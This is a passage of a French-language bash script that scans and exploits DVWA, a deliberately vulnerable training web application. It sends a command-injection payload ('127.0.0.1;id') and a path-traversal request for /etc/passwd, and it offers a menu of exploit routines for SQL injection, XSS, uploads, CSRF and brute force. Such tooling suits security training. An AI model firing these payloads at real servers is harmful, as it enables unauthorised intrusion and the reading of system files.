    local cmd=$(curl -s -b "$cookie_jar" -X POST -d "ip=127.0.0.1;id&Submit=Submit" "http://${IP}:${PORT}/vulnerabilities/exec/")
    echo "$cmd" | grep -q "uid=" && echo "   ✅ VULNERABLE" | tee -a "$report" || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 4: LFI
    echo -e "${CYAN}[4/7] LFI...${NC}" | tee -a "$report"
    local lfi=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
    echo "$lfi" | grep -q "root:x:0" && echo "   ✅ VULNERABLE" | tee -a "$report" || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 5: CSRF
    echo -e "${CYAN}[5/7] CSRF...${NC}" | tee -a "$report"
    local csrf=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/csrf/")
    echo "$csrf" | grep -q "user_token" && echo "   ✅ PROTECTED" | tee -a "$report" || echo "   ✅ VULNERABLE" | tee -a "$report"

    # Test 6-7
    echo -e "${CYAN}[6/7] File Upload...${NC}" | tee -a "$report"
    echo "   ⚠️  MANUAL TEST" | tee -a "$report"
    echo -e "${CYAN}[7/7] Brute Force...${NC}" | tee -a "$report"
    echo "   ⚠️  MANUAL TEST" | tee -a "$report"

    {
        echo ""
        echo "═══════════════════════════════════════════"
        echo "Scan terminé: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Rapport: $report"
        echo "═══════════════════════════════════════════"
    } | tee -a "$report"

    cleanup_cookie_jar "$cookie_jar"

    echo
    echo -e "${GREEN}✅ Scan terminé !${NC}"
    echo -e "${CYAN}📄 Rapport: $report${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# Menu Principal
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║               DVWA Exploits               ║${NC}"
        echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
        echo
        echo -e "${GREEN}1)  🔓 SQL Injection${NC}"
        echo -e "${GREEN}2)  💉 XSS Reflected${NC}"
        echo -e "${GREEN}3)  ⚡ Command Injection${NC}"
        echo -e "${GREEN}4)  📤 File Upload${NC}"
        echo -e "${GREEN}5)  📂 LFI (Local File Inclusion)${NC}"
        echo -e "${GREEN}6)  🔐 CSRF${NC}"
        echo -e "${GREEN}7)  🔨 Brute Force${NC}"
        echo -e "${CYAN}8)  🔍 Full Scan${NC}"
        echo -e "${MAGENTA}9)  📜 Logs${NC}"
        echo -e "${RED}0)  ❌ Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            7) exploit_bruteforce ;;
            8) full_scan ;;
            9)
                clear
                banner
                echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
                echo -e "${CYAN}║              Logs d'Exploits               ║${NC}"
                echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
                echo

                for log in "$LOG_DIR"/*.log; do
                    if [ -f "$log" ]; then
                        echo -e "${GREEN}═══ $(basename "$log") ═══${NC}"
                        tail -n 5 "$log"
                        echo
                    fi
                done

                if [ ! "$(ls -A $LOG_DIR/*.log 2>/dev/null)" ]; then
                    echo -e "${YELLOW}Aucun log trouvé${NC}"
                fi

                read -p "👉 Entrée pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}❌ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrée
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
